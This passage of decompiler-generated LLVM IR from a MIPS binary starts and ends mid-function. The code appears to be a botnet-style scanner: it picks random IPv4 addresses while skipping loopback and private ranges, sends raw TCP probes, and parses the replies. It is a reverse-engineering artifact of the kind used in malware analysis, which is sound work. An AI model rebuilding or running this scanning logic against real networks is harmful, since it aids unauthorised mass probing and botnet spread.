  %v1_403374 = and i32 %v1_403370, 254
  %v1_403378 = icmp ult i32 %v1_403374, 14
  %v2_403378 = zext i1 %v1_403378 to i32
  store i32 %v2_403378, i32* %v0.global-to-local, align 4
  store i32 %v0_403368, i32* %a0.global-to-local, align 4
  br i1 %v1_403378, label %dec_label_pc_4033b8, label %dec_label_pc_403380

dec_label_pc_403380:                              ; preds = %dec_label_pc_403360
  %v3_403384 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_403384, i32* @t9, align 4
  %v2_40338c = call i32 @function_405f40(i32 %v0_403368)
  store i32 %v2_40338c, i32* @v0, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_40339c = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_40339c, i32* @t9, align 4
  store i32 10, i32* %a0.global-to-local, align 4
  %v2_4033a4 = call i32 @function_406440(i32 10)
  store i32 %v2_4033a4, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4033b8

dec_label_pc_4033b8:                              ; preds = %dec_label_pc_403360, %dec_label_pc_403380
  %v0_4033bc = load i32, i32* @s7, align 4
  %v2_4033bc = icmp eq i32 %v0_4033bc, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_4033bc, label %dec_label_pc_4033d4, label %dec_label_pc_4033c0

dec_label_pc_4033c0:                              ; preds = %dec_label_pc_4033b8
  %v2_4033c4 = icmp eq i32 %v0_4033bc, 2
  store i32 80, i32* %v0.global-to-local, align 4
  br i1 %v2_4033c4, label %dec_label_pc_4033d4, label %dec_label_pc_4032e0

dec_label_pc_4033d4:                              ; preds = %dec_label_pc_4033c0, %dec_label_pc_4033b8
  store i32 52869, i32* %v1.global-to-local, align 4
  store i32 0, i32* %stack_var_-2928, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v0_4033ec = load i32, i32* @s6, align 4
  %v1_4033ec = add i32 %v0_4033ec, 16
  store i32 %v1_4033ec, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4033f0

dec_label_pc_4033f0:                              ; preds = %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge, %dec_label_pc_4033d4
  %v0_403410 = phi i32 [ %v1_403418, %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge ], [ %v1_4033ec, %dec_label_pc_4033d4 ]
  %v1_403408 = phi i32 [ %v1_403408.pre, %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge ], [ %v0_4033ec, %dec_label_pc_4033d4 ]
  %v0_403400 = phi i32 [ %v2_40341c, %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge ], [ 0, %dec_label_pc_4033d4 ]
  %v1_403400 = add i32 %v0_403400, 1
  store i32 %v1_403400, i32* %a2.global-to-local, align 4
  %v1_403404 = mul i32 %v0_403400, 536
  %v2_403408 = add i32 %v1_403404, %v1_403408
  store i32 %v2_403408, i32* %v0.global-to-local, align 4
  %v1_40340c = icmp slt i32 %v1_403400, 160
  %v2_40340c = zext i1 %v1_40340c to i32
  store i32 %v2_40340c, i32* %v1.global-to-local, align 4
  %v1_403410 = inttoptr i32 %v0_403410 to i8*
  store i8 0, i8* %v1_403410, align 1
  %v0_403414 = load i32, i32* %a3.global-to-local, align 4
  %v1_403414 = load i32, i32* %v0.global-to-local, align 4
  %v2_403414 = add i32 %v1_403414, 8
  %v3_403414 = inttoptr i32 %v2_403414 to i32*
  store i32 %v0_403414, i32* %v3_403414, align 4
  %v0_403418 = load i32, i32* %a0.global-to-local, align 4
  %v1_403418 = add i32 %v0_403418, 536
  store i32 %v1_403418, i32* %a0.global-to-local, align 4
  %v0_40341c = load i32, i32* %v1.global-to-local, align 4
  %v1_40341c = icmp eq i32 %v0_40341c, 0
  %v2_40341c = load i32, i32* %a2.global-to-local, align 4
  store i32 %v2_40341c, i32* %a1.global-to-local, align 4
  br i1 %v1_40341c, label %dec_label_pc_403420, label %dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge

dec_label_pc_4033f0.dec_label_pc_4033f0_crit_edge: ; preds = %dec_label_pc_4033f0
  %v1_403408.pre = load i32, i32* @s6, align 4
  br label %dec_label_pc_4033f0

dec_label_pc_403420:                              ; preds = %dec_label_pc_4033f0
  %v3_403424 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_403424, i32* @t9, align 4
  store i32 160, i32* %v0.global-to-local, align 4
  store i32 160, i32* %stack_var_-2928, align 4
  %v5_40342c = call i32 @function_4028bc()
  %v3_403434 = load i32, i32* %stack_var_-2892, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 268435455, i32* %s0.global-to-local, align 4
  %v2_403450 = urem i32 %v3_403434, 16777216
  %v2_403460 = or i32 %v2_403450, 1157627904
  store i32 %v2_403460, i32* %a0.global-to-local, align 4
  %v3_403464 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_403464, i32* @t9, align 4
  store i32 40, i32* %v1.global-to-local, align 4
  %v1_40346c = urem i32 %v5_40342c, 65536
  store i32 %v1_40346c, i32* %v0.global-to-local, align 4
  store i32 %v2_403460, i32* %stack_var_-2892, align 4
  %v6_403478 = call i32 @function_4028bc()
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 1342177280, i32* %v1.global-to-local, align 4
  %sext13 = mul i32 %v5_40342c, 65536
  %v4_403490 = sdiv i32 %sext13, 65536
  store i32 %v4_403490, i32* %a1.global-to-local, align 4
  store i32 -12667, i32* %a2.global-to-local, align 4
  %v1_40349c = load i32, i32* %s0.global-to-local, align 4
  %v2_40349c = and i32 %v1_40349c, %tmp73
  %v2_4034a0 = or i32 %v2_40349c, 1342177280
  store i32 %v2_4034a0, i32* %a0.global-to-local, align 4
  %v3_4034a4 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_4034a4, i32* @t9, align 4
  store i32 6, i32* %v0.global-to-local, align 4
  %v6_4034b8 = trunc i32 %v4_403490 to i16
  store i16 %v6_4034b8, i16* %stack_var_-2872, align 2
  %v6_4034bc = call i32 @function_4028bc()
  store i32 131072, i32* %v1.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v2_4034dc = ptrtoint i16* %stack_var_-2872 to i32
  %v3_4034e8 = load i32, i32* bitcast (i32** @global_var_4494bc.248 to i32*), align 4
  store i32 %v3_4034e8, i32* %v0.global-to-local, align 4
  %v1_4034f8 = icmp eq i32 %v3_4034e8, 0
  br i1 %v1_4034f8, label %dec_label_pc_4036c8, label %dec_label_pc_4034fc

dec_label_pc_4034fc:                              ; preds = %dec_label_pc_403420
  store i32 0, i32* %stack_var_-2928, align 4
  %v2_403640 = add i32 %v2_4034dc, 4
  %v3_403640 = inttoptr i32 %v2_403640 to i32*
  %v4_40366c = add i32 %v2_4034dc, 16
  %v5_40366c = inttoptr i32 %v4_40366c to i16*
  %v2_403680 = ptrtoint i32* %stack_var_-2908 to i32
  br label %dec_label_pc_403504

dec_label_pc_403504:                              ; preds = %dec_label_pc_4035fc, %dec_label_pc_4034fc
  %v3_403504 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_403504, i32* @t9, align 4
  %v1_40350c = call i32 @function_4028bc()
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_40351c = load i32, i32* @global_var_449490, align 4
  store i32 %v3_40351c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403530

dec_label_pc_403530:                              ; preds = %dec_label_pc_4035f8, %dec_label_pc_4035e0, %dec_label_pc_4035d0, %dec_label_pc_403530, %dec_label_pc_403504
  %v3_403530 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_403530, i32* @t9, align 4
  store i32 -2139095040, i32* %s0.global-to-local, align 4
  %v1_403538 = call i32 @function_4028bc()
  %v2_403538 = sext i32 %v1_403538 to i64
  store i32 -2139062143, i32* %s0.global-to-local, align 4
  %v5_403544 = mul nuw nsw i64 %v2_403538, 2155905153
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403550 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_403550, i32* @t9, align 4
  %v1_4035584 = udiv i64 %v5_403544, 549755813888
  %v1_403558 = trunc i64 %v1_4035584 to i32
  store i32 %v1_403558, i32* %v1.global-to-local, align 4
  %v3_40355c = add i32 %v1_403558, %v1_403538
  store i32 %v3_40355c, i32* %v0.global-to-local, align 4
  %v2_403560 = urem i32 %v3_40355c, 256
  store i32 %v2_403560, i32* %s1.global-to-local, align 4
  %v3_403560 = call i32 @function_4028bc()
  %v4_403560 = sext i32 %v3_403560 to i64
  %v2_403568 = load i32, i32* %s0.global-to-local, align 4
  %v4_403568 = zext i32 %v2_403568 to i64
  %v5_403568 = mul nuw nsw i64 %v4_403568, %v4_403560
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403574 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_403574, i32* @t9, align 4
  %v1_40357c6 = udiv i64 %v5_403568, 549755813888
  %v1_40357c = trunc i64 %v1_40357c6 to i32
  store i32 %v1_40357c, i32* %v1.global-to-local, align 4
  %v3_403580 = add i32 %v1_40357c, %v3_403560
  store i32 %v3_403580, i32* %v0.global-to-local, align 4
  %v2_403584 = urem i32 %v3_403580, 256
  store i32 %v2_403584, i32* %s2.global-to-local, align 4
  %v3_403584 = call i32 @function_4028bc()
  %v4_403584 = sext i32 %v3_403584 to i64
  %v2_40358c = load i32, i32* %s0.global-to-local, align 4
  %v4_40358c = zext i32 %v2_40358c to i64
  %v5_40358c = mul nuw nsw i64 %v4_40358c, %v4_403584
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403598 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_403598, i32* @t9, align 4
  %v1_4035a08 = udiv i64 %v5_40358c, 549755813888
  %v1_4035a0 = trunc i64 %v1_4035a08 to i32
  store i32 %v1_4035a0, i32* %v1.global-to-local, align 4
  %v3_4035a4 = add i32 %v1_4035a0, %v3_403584
  store i32 %v3_4035a4, i32* %v0.global-to-local, align 4
  %v2_4035a8 = urem i32 %v3_4035a4, 256
  store i32 %v2_4035a8, i32* %s3.global-to-local, align 4
  %v3_4035a8 = call i32 @function_4028bc()
  %v4_4035a8 = sext i32 %v3_4035a8 to i64
  %v2_4035b0 = load i32, i32* %s0.global-to-local, align 4
  %v4_4035b0 = zext i32 %v2_4035b0 to i64
  %v5_4035b0 = mul nuw nsw i64 %v4_4035b0, %v4_4035a8
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v1_4035bc10 = udiv i64 %v5_4035b0, 549755813888
  %v1_4035bc = trunc i64 %v1_4035bc10 to i32
  %v3_4035c0 = add i32 %v1_4035bc, %v3_4035a8
  %v1_4035c4 = urem i32 %v3_4035c0, 256
  store i32 %v1_4035c4, i32* %a0.global-to-local, align 4
  store i32 127, i32* %v0.global-to-local, align 4
  %v0_4035cc = load i32, i32* %s1.global-to-local, align 4
  %v2_4035cc = icmp eq i32 %v0_4035cc, 127
  br i1 %v2_4035cc, label %dec_label_pc_403530, label %dec_label_pc_4035d0

dec_label_pc_4035d0:                              ; preds = %dec_label_pc_403530
  %v1_4035d4 = icmp eq i32 %v0_4035cc, 0
  store i32 192, i32* %v0.global-to-local, align 4
  br i1 %v1_4035d4, label %dec_label_pc_403530, label %dec_label_pc_4035d8

dec_label_pc_4035d8:                              ; preds = %dec_label_pc_4035d0
  %v2_4035dc = icmp eq i32 %v0_4035cc, 192
  store i32 55, i32* %v0.global-to-local, align 4
  %v0_4035e8 = load i32, i32* %s2.global-to-local, align 4
  br i1 %v2_4035dc, label %dec_label_pc_4035e0, label %dec_label_pc_4035d8.dec_label_pc_4035f8_crit_edge

dec_label_pc_4035d8.dec_label_pc_4035f8_crit_edge: ; preds = %dec_label_pc_4035d8
  %.pre = mul i32 %v0_4035e8, 65536
  br label %dec_label_pc_4035f8

dec_label_pc_4035e0:                              ; preds = %dec_label_pc_4035d8
  %v2_4035e8 = icmp eq i32 %v0_4035e8, 168
  %v4_4035e8 = mul i32 %v0_4035e8, 65536
  store i32 %v4_4035e8, i32* %v0.global-to-local, align 4
  br i1 %v2_4035e8, label %dec_label_pc_403530, label %dec_label_pc_4035ec

dec_label_pc_4035ec:                              ; preds = %dec_label_pc_4035e0
  store i32 -1073741824, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4035f8

dec_label_pc_4035f8:                              ; preds = %dec_label_pc_4035d8.dec_label_pc_4035f8_crit_edge, %dec_label_pc_4035ec
  %v4_4035f8.pre-phi = phi i32 [ %.pre, %dec_label_pc_4035d8.dec_label_pc_4035f8_crit_edge ], [ %v4_4035e8, %dec_label_pc_4035ec ]
  %v1_4035f8 = phi i32 [ 55, %dec_label_pc_4035d8.dec_label_pc_4035f8_crit_edge ], [ %v4_4035e8, %dec_label_pc_4035ec ]
  %v2_4035f8 = icmp eq i32 %v0_4035cc, %v1_4035f8
  store i32 %v4_4035f8.pre-phi, i32* %v0.global-to-local, align 4
  br i1 %v2_4035f8, label %dec_label_pc_403530, label %dec_label_pc_4035fc

dec_label_pc_4035fc:                              ; preds = %dec_label_pc_4035f8
  %v1_403600 = mul i32 %v0_4035cc, 16777216
  %v2_403604 = or i32 %v1_403600, %v1_4035c4
  %v2_403608 = or i32 %v2_403604, %v4_4035f8.pre-phi
  store i32 %v2_403608, i32* %v1.global-to-local, align 4
  %v0_40360c = load i32, i32* %s3.global-to-local, align 4
  %v1_40360c = mul i32 %v0_40360c, 256
  %v2_403614 = or i32 %v1_40360c, %v2_403608
  store i32 %v2_403614, i32* %v0.global-to-local, align 4
  store i32 %v3_403200, i32* @a0, align 4
  store i32 20, i32* @a1, align 4
  %v6_403624 = call i32 @function_4002d0(i32 %v3_403200, i32 20)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_4034dc, i32* %v0.global-to-local, align 4
  store i32 %v2_403614, i32* %v3_403640, align 4
  store i32 -12667, i32* %v1.global-to-local, align 4
  store i32 %v3_403200, i32* %a0.global-to-local, align 4
  %v2_40364c = load i32, i32* %v0.global-to-local, align 4
  %v3_40364c = add i32 %v2_40364c, 2
  %v4_40364c = inttoptr i32 %v3_40364c to i16*
  store i16 -12667, i16* %v4_40364c, align 2
  %v0_403650 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_403650, i32* @a1, align 4
  store i32 20, i32* %a2.global-to-local, align 4
  store i32 20, i32* @a3, align 4
  %v2_40365c = add i32 %v0_403650, 16
  %v3_40365c = inttoptr i32 %v2_40365c to i16*
  store i16 0, i16* %v3_40365c, align 2
  %sext = mul i32 %v6_403624, 65536
  %v9_40365c = sdiv i32 %sext, 65536
  %v10_40365c = call i32 @function_400328(i32 %v3_403200, i32 %v0_403650, i32 20, i32 20, i32 %v9_40365c)
  %v11_40365c = trunc i32 %v10_40365c to i16
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i16 %v11_40365c, i16* %v5_40366c, align 2
  store i32 %v2_403614, i32* %v1.global-to-local, align 4
  store i32 2, i32* %stack_var_-2908, align 4
  %v3_403684 = load i32, i32* @global_var_44938c.255, align 4
  store i32 %v3_403684, i32* @t9, align 4
  store i32 16, i32* %v0.global-to-local, align 4
  %v0_40369c = load i32, i32* @s4, align 4
  store i32 %v0_40369c, i32* %a0.global-to-local, align 4
  store i32 %v3_403200, i32* %a1.global-to-local, align 4
  store i32 40, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v8_4036a8 = call i32 @function_4059a0(i32 %v0_40369c, i32* nonnull %stack_var_-2892, i32 40, i32 16384, i32 %v2_403680, i32 16)
  %v3_4036b0 = load i32, i32* %stack_var_-2928, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v1_4036b8 = add i32 %v3_4036b0, 1
  store i32 %v1_4036b8, i32* %v0.global-to-local, align 4
  %v1_4036bc = icmp slt i32 %v1_4036b8, 128
  %v2_4036bc = zext i1 %v1_4036bc to i32
  store i32 %v2_4036bc, i32* %v1.global-to-local, align 4
  store i32 %v1_4036b8, i32* %stack_var_-2928, align 4
  br i1 %v1_4036bc, label %dec_label_pc_403504, label %dec_label_pc_4036c8

dec_label_pc_4036c8:                              ; preds = %dec_label_pc_4035fc, %dec_label_pc_403420
  %v3_4036c8 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4036c8, i32* @t9, align 4
  %v1_4036d0 = call i32 @function_405490()
  store i32 %v1_4036d0, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v1_4036d0, i32* %s3.global-to-local, align 4
  %v2_4036f4 = ptrtoint i32* %stack_var_-1572 to i32
  %v4_403744 = zext i8 %tmp59 to i32
  %v4_403754 = zext i16 %tmp58 to i32
  %v2_40374c = icmp eq i8 %tmp59, 6
  br label %dec_label_pc_4036e0

dec_label_pc_4036e0:                              ; preds = %dec_label_pc_403750, %dec_label_pc_403740, %dec_label_pc_403724, %dec_label_pc_40371c, %dec_label_pc_4036c8
  %v0_4036e4 = phi i32 [ %v1_4036d0, %dec_label_pc_4036c8 ], [ %v0_403710, %dec_label_pc_40371c ], [ %v0_403710, %dec_label_pc_403724 ], [ %v0_403710, %dec_label_pc_403740 ], [ %v0_403710, %dec_label_pc_403750 ]
  %v3_4036e0 = load i32, i32* @global_var_44944c.225, align 4
  store i32 %v3_4036e0, i32* @t9, align 4
  %v1_4036e4 = inttoptr i32 %v0_4036e4 to i32*
  store i32 0, i32* %v1_4036e4, align 4
  %v0_4036e8 = load i32, i32* @s4, align 4
  store i32 %v0_4036e8, i32* %a0.global-to-local, align 4
  store i32 %v2_4036f4, i32* %a1.global-to-local, align 4
  store i32 1514, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v8_4036fc = call i32 @function_4058c0(i32 %v0_4036e8, i32* nonnull %stack_var_-1572, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v8_4036fc, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v1_403708 = icmp slt i32 %v8_4036fc, 1
  store i32 %v8_4036fc, i32* %a0.global-to-local, align 4
  br i1 %v1_403708, label %dec_label_pc_403834, label %dec_label_pc_40370c

dec_label_pc_40370c:                              ; preds = %dec_label_pc_4036e0
  %v0_403710 = load i32, i32* %s3.global-to-local, align 4
  %v1_403710 = inttoptr i32 %v0_403710 to i32*
  %v2_403710 = load i32, i32* %v1_403710, align 4
  store i32 %v2_403710, i32* %v1.global-to-local, align 4
  %v2_403718 = icmp eq i32 %v2_403710, 11
  %v4_403718 = icmp ult i32 %v8_4036fc, 40
  %v5_403718 = zext i1 %v4_403718 to i32
  store i32 %v5_403718, i32* %v0.global-to-local, align 4
  br i1 %v2_403718, label %dec_label_pc_403834, label %dec_label_pc_40371c

dec_label_pc_40371c:                              ; preds = %dec_label_pc_40370c
  %v1_403720 = icmp eq i1 %v4_403718, false
  br i1 %v1_403720, label %dec_label_pc_403724, label %dec_label_pc_4036e0

dec_label_pc_403724:                              ; preds = %dec_label_pc_40371c
  %v3_403728 = load i32, i32* @global_var_449490, align 4
  store i32 %v3_403728, i32* %v1.global-to-local, align 4
  %v2_40373c = icmp eq i32 %tmp60, %v3_403728
  store i32 6, i32* %v0.global-to-local, align 4
  br i1 %v2_40373c, label %dec_label_pc_403740, label %dec_label_pc_4036e0

dec_label_pc_403740:                              ; preds = %dec_label_pc_403724
  store i32 %v4_403744, i32* %v1.global-to-local, align 4
  br i1 %v2_40374c, label %dec_label_pc_403750, label %dec_label_pc_4036e0

dec_label_pc_403750:                              ; preds = %dec_label_pc_403740
  store i32 %v4_403754, i32* %v0.global-to-local, align 4
  store i32 -12667, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4036e0

dec_label_pc_403834:                              ; preds = %dec_label_pc_40370c, %dec_label_pc_4036e0
  %v2_403834 = ptrtoint i32* %stack_var_-2852 to i32
  store i32 %v2_403834, i32* %v0.global-to-local, align 4
  %v2_403838 = ptrtoint i32* %stack_var_-2724 to i32
  store i32 %v2_403838, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_40383c

dec_label_pc_40383c:                              ; preds = %dec_label_pc_40383c, %dec_label_pc_403834
  %v0_40383c = phi i32 [ %v1_403840, %dec_label_pc_40383c ], [ %v2_403834, %dec_label_pc_403834 ]
  %v1_40383c = inttoptr i32 %v0_40383c to i32*
  store i32 0, i32* %v1_40383c, align 4
  %v0_403840 = load i32, i32* %v0.global-to-local, align 4
  %v1_403840 = add i32 %v0_403840, 4
  store i32 %v1_403840, i32* %v0.global-to-local, align 4
  %v1_403844 = load i32, i32* %v1.global-to-local, align 4
  %v2_403844 = icmp eq i32 %v1_403840, %v1_403844
  br i1 %v2_403844, label %dec_label_pc_403848, label %dec_label_pc_40383c

dec_label_pc_403848:                              ; preds = %dec_label_pc_40383c
  %v2_40384c = ptrtoint i32* %stack_var_-2596 to i32
  store i32 %v2_40384c, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403850

dec_label_pc_403850:                              ; preds = %dec_label_pc_403850, %dec_label_pc_403848
  %v0_403850 = phi i32 [ %v1_403854, %dec_label_pc_403850 ], [ %v1_403840, %dec_label_pc_403848 ]
  %v1_403850 = inttoptr i32 %v0_403850 to i32*
  store i32 0, i32* %v1_403850, align 4
  %v0_403854 = load i32, i32* %v0.global-to-local, align 4
  %v1_403854 = add i32 %v0_403854, 4
  store i32 %v1_403854, i32* %v0.global-to-local, align 4
  %v1_403858 = load i32, i32* %v1.global-to-local, align 4
  %v2_403858 = icmp eq i32 %v1_403854, %v1_403858
  store i32 0, i32* %s1.global-to-local, align 4
  br i1 %v2_403858, label %dec_label_pc_40385c, label %dec_label_pc_403850

dec_label_pc_40385c:                              ; preds = %dec_label_pc_403850
  store i32 0, i32* %stack_var_-2928, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v2_40396c = ptrtoint i32* %stack_var_-2928 to i32
  br label %dec_label_pc_403868

dec_label_pc_403868:                              ; preds = %dec_label_pc_4039cc, %dec_label_pc_40385c
  %v1_403874 = phi i32 [ 0, %dec_label_pc_40385c ], [ %v1_4039d4, %dec_label_pc_4039cc ]
  %stack_var_-56.0 = phi i32 [ %tmp53, %dec_label_pc_40385c ], [ %stack_var_-56.1, %dec_label_pc_4039cc ]
  %v1_40386c = mul i32 %v1_403874, 64
  store i32 %v1_40386c, i32* %v1.global-to-local, align 4
  %v1_403878 = mul i32 %v1_403874, 536
  store i32 %v1_403878, i32* %v0.global-to-local, align 4
  %v0_40387c = load i32, i32* @s6, align 4
  %v2_40387c = add i32 %v0_40387c, %v1_403878
  store i32 %v2_40387c, i32* @s0, align 4
  %v1_403880 = add i32 %v2_40387c, 8
  %v2_403880 = inttoptr i32 %v1_403880 to i32*
  %v3_403880 = load i32, i32* %v2_403880, align 4
  store i32 %v3_403880, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_403888 = icmp eq i32 %v3_403880, -1
  br i1 %v2_403888, label %dec_label_pc_4039cc, label %dec_label_pc_40388c

dec_label_pc_40388c:                              ; preds = %dec_label_pc_403868
  %v1_403890 = add i32 %v2_40387c, 16
  %v2_403890 = inttoptr i32 %v1_403890 to i8*
  %v3_403890 = load i8, i8* %v2_403890, align 1
  %v4_403890 = zext i8 %v3_403890 to i32
  store i32 %v4_403890, i32* %a2.global-to-local, align 4
  %v1_403898 = icmp eq i8 %v3_403890, 0
  br i1 %v1_403898, label %dec_label_pc_4039cc, label %dec_label_pc_40389c

dec_label_pc_40389c:                              ; preds = %dec_label_pc_40388c
  %v0_4038a0 = load i32, i32* %gp.global-to-local, align 4
  %v1_4038a0 = add i32 %v0_4038a0, -32020
  %v2_4038a0 = inttoptr i32 %v1_4038a0 to i32*
  %v3_4038a0 = load i32, i32* %v2_4038a0, align 4
  store i32 %v3_4038a0, i32* %v0.global-to-local, align 4
  %v1_4038a4 = add i32 %v2_40387c, 532
  %v2_4038a4 = inttoptr i32 %v1_4038a4 to i32*
  %v3_4038a4 = load i32, i32* %v2_4038a4, align 4
  store i32 %v3_4038a4, i32* %a0.global-to-local, align 4
  %v1_4038a8 = inttoptr i32 %v3_4038a0 to i32*
  %v2_4038a8 = load i32, i32* %v1_4038a8, align 4
  store i32 %v2_4038a8, i32* %v0.global-to-local, align 4
  %v1_4038ac = add i32 %v2_40387c, 12
  %v2_4038ac = inttoptr i32 %v1_4038ac to i32*
  %v3_4038ac = load i32, i32* %v2_4038ac, align 4
  %v2_4038b0 = sub i32 %v2_4038a8, %v3_4038a4
  %v2_4038b4 = icmp ult i32 %v3_4038ac, %v2_4038b0
  %v3_4038b4 = zext i1 %v2_4038b4 to i32
  store i32 %v3_4038b4, i32* %v0.global-to-local, align 4
  %v1_4038b8 = icmp eq i1 %v2_4038b4, false
  store i32 1, i32* %v1.global-to-local, align 4
  br i1 %v1_4038b8, label %dec_label_pc_40396c, label %dec_label_pc_4038bc

dec_label_pc_4038bc:                              ; preds = %dec_label_pc_40389c
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_4038c4 = icmp eq i8 %v3_403890, 4
  store i32 0, i32* %a1.global-to-local, align 4
  br i1 %v2_4038c4, label %dec_label_pc_4038c8, label %dec_label_pc_403908

dec_label_pc_4038c8:                              ; preds = %dec_label_pc_4038bc
  %v1_4038cc = add i32 %v0_4038a0, -32736
  %v2_4038cc = inttoptr i32 %v1_4038cc to i32*
  %v3_4038cc = load i32, i32* %v2_4038cc, align 4
  %v1_4038d4 = add i32 %v3_4038cc, 12276
  store i32 %v2_40387c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4038d4)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_4038e8 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_4038f0 = add i32 %v3_4038e8, 12404
  %v1_4038f4 = load i32, i32* @s0, align 4
  store i32 %v1_4038f4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4038f0)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v0_403910.pre = load i32, i32* %a2.global-to-local, align 4
  %v3_403910.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_403908

dec_label_pc_403908:                              ; preds = %dec_label_pc_4038bc, %dec_label_pc_4038c8
  %v1_403920 = phi i32 [ %v2_40387c, %dec_label_pc_4038bc ], [ %v3_403910.pre, %dec_label_pc_4038c8 ]
  %v0_403910 = phi i32 [ %v4_403890, %dec_label_pc_4038bc ], [ %v0_403910.pre, %dec_label_pc_4038c8 ]
  %v0_40390c = phi i32 [ %v0_4038a0, %dec_label_pc_4038bc ], [ %v2_403164, %dec_label_pc_4038c8 ]
  store i32 5, i32* %v0.global-to-local, align 4
  %v1_40390c = add i32 %v0_40390c, -32736
  %v2_40390c = inttoptr i32 %v1_40390c to i32*
  %v3_40390c = load i32, i32* %v2_40390c, align 4
  store i32 %v3_40390c, i32* %v1.global-to-local, align 4
  %v2_403910 = icmp eq i32 %v0_403910, 5
  store i32 %v1_403920, i32* %a0.global-to-local, align 4
  br i1 %v2_403910, label %dec_label_pc_403914, label %dec_label_pc_403954

dec_label_pc_403914:                              ; preds = %dec_label_pc_403908
  %v1_403918 = add i32 %v3_40390c, 12276
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v1_403920, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403918)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403930 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403938 = add i32 %v3_403930, 12404
  %v1_40393c = load i32, i32* @s0, align 4
  store i32 %v1_40393c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403938)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 2, i32* %v0.global-to-local, align 4
  %v2_403950 = load i32, i32* @s0, align 4
  %v3_403950 = add i32 %v2_403950, 17
  %v4_403950 = inttoptr i32 %v3_403950 to i8*
  store i8 2, i8* %v4_403950, align 1
  %v0_403954.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403954

dec_label_pc_403954:                              ; preds = %dec_label_pc_403908, %dec_label_pc_403914
  %v0_403954 = phi i32 [ %v3_40390c, %dec_label_pc_403908 ], [ %v0_403954.pre, %dec_label_pc_403914 ]
  %v1_403954 = add i32 %v0_403954, 12276
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403954)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403970.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_403974.pre = load i32, i32* %a2.global-to-local, align 4
  %v1_403974.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_40396c

dec_label_pc_40396c:                              ; preds = %dec_label_pc_40389c, %dec_label_pc_403954
  %v0_403988 = phi i32 [ 1, %dec_label_pc_40389c ], [ %v1_403974.pre, %dec_label_pc_403954 ]
  %v0_403974 = phi i32 [ %v4_403890, %dec_label_pc_40389c ], [ %v0_403974.pre, %dec_label_pc_403954 ]
  %v1_403990 = phi i32 [ %v3_403880, %dec_label_pc_40389c ], [ %v0_403970.pre, %dec_label_pc_403954 ]
  store i32 %v2_40396c, i32* %v0.global-to-local, align 4
  %v1_403970 = udiv i32 %v1_403990, 32
  store i32 %v1_403970, i32* %a0.global-to-local, align 4
  %v2_403974 = icmp eq i32 %v0_403974, %v0_403988
